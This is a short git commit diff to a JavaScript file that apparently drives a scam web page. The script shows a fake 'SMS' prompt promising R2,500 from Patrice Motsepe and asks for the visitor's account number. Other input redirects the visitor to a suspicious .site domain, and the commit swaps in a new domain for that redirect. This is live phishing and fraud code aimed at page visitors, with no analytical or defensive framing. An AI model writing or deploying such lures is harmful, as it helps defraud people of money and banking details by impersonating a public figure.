8fe99550fc6684e641e2a8b90ebea50a2a0140ff
usorondo72 <rind_misuses5d@icloud.com>
2026-05-28 19:44:38 +0100

    Update motsepe.js

--- motsepe.js
+++ motsepe.js
@@ -1,5 +1,5 @@
 var password = 'WITHDRAW R2,500'
 password=prompt('SMS: Congratulations, you are eligible to receive R2,500 From Patrice Motsepe, click OK to Enter Your Acc. Number','WITHDRAW R2,500');
 if (password != 'WITHDRAW R2,500') {
-location.href='https://www.itidgheghe.site/motsepe-r2500-gift';
+location.href='https://www.prickbbyr.site/motsepe-r2500-gift';
 }
